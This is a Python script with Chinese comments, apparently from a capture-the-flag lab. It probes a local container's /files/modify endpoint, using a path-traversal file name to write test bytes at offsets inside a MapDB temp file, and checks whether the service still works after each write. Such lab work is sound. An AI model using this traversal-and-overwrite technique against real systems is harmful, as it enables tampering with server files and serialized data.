#!/usr/bin/env python3
"""测试哪些偏移量是安全的"""
import requests
import base64
import subprocess
import time
import sys

def restart_container():
    subprocess.run("docker restart staircase_ctf", shell=True, capture_output=True)
    time.sleep(4)
    
def get_mapdb_name():
    result = subprocess.run('docker exec staircase_ctf sh -c "ls /tmp/mapdb*temp | head -1"', 
                           shell=True, capture_output=True, text=True)
    return result.stdout.strip().split('/')[-1]

def test_write_offset(mapdb_name, offset):
    """测试写入特定偏移量"""
    url = 'http://localhost:8080'
    mapdb_path = f"../../../tmp/{mapdb_name}"
    
    # 首先确认 icon 可以正常读取
    try:
        resp = requests.get(f'{url}/files/icon', timeout=5)
        if resp.status_code != 200:
            return "FAIL_BEFORE", f"Icon failed before write: {resp.status_code}"
    except Exception as e:
        return "FAIL_BEFORE", str(e)
    
    # 写入测试数据
    data = b'TESTTEST'  # 8 bytes
    payload = {
        'fileName': mapdb_path,
        'data': base64.b64encode(data).decode(),
        'offset': offset
    }
    
    try:
        resp = requests.put(f'{url}/files/modify', json=payload, timeout=5)
        if resp.status_code != 200:
            return "WRITE_FAIL", f"Write failed: {resp.status_code}"
    except Exception as e:
        return "WRITE_FAIL", str(e)
    
    # 尝试读取 icon
    try:
        resp = requests.get(f'{url}/files/icon', timeout=5)
        if resp.status_code == 200:
            return "OK", "Icon still works after write"
        else:
            return "CORRUPT", f"Icon failed after write: {resp.status_code}"
    except Exception as e:
        return "CORRUPT", str(e)

def main():
    # 测试不同的偏移量
    # 0x100246-0x10024F 是序列化数据前的零区域
    # 0x100250 是序列化流开始
    
    offsets_to_test = [
        0x100240,  # 在元数据末尾 
        0x100243,  # 稍微往后
        0x100246,  # 零区域开始
        0x100249,  # 我们之前尝试的位置
        0x10024C,  # 再靠后
        0x100250,  # 序列化流头开始
        0x100260,  # 序列化流内部
        0x100350,  # 远离数据的零区域
    ]
    
    print("Testing write offsets...")
    print("-" * 60)
    
    for offset in offsets_to_test:
        restart_container()
        mapdb_name = get_mapdb_name()
        
        result, msg = test_write_offset(mapdb_name, offset)
        status_icon = "✓" if result == "OK" else "✗"
        print(f"Offset 0x{offset:06x}: [{result:12s}] {status_icon} {msg}")

if __name__ == "__main__":
    main()
